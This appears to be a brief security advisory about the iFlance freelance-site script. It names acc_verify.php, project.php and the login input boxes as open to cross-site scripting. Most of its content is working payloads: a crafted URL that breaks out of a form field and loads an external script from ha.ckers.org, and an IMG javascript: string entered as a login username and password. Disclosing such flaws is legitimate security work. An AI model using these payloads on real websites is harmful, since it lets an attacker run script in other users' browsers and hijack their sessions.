iFlance
Homepage:
http://www.ifusionservices.co.uk/

Description:
iFlance is a powerful freelance script, that allows anyone to run their very own own professional, profitable 

Freelancing website

Effected files:
acc_verify.php
project.php
all input boxes

XSS BY URL Injection of acc_verify.php

We put "> before and <" after the script tags to close the input box tags in the form box.

http://www.example.com/account/acc_verify.php?vk="><SCRIPT%20SRC=http://ha.ckers.org/xss.js></SCRIPT><"&verify=verify

Another XSS attack is possible if you put this in the login box as username and pw:

<IMG SRC=javascript:alert(&#0000039XSS&#0000039)>

project.php is vulnerable too due to the input boxes on it for posting a new project.
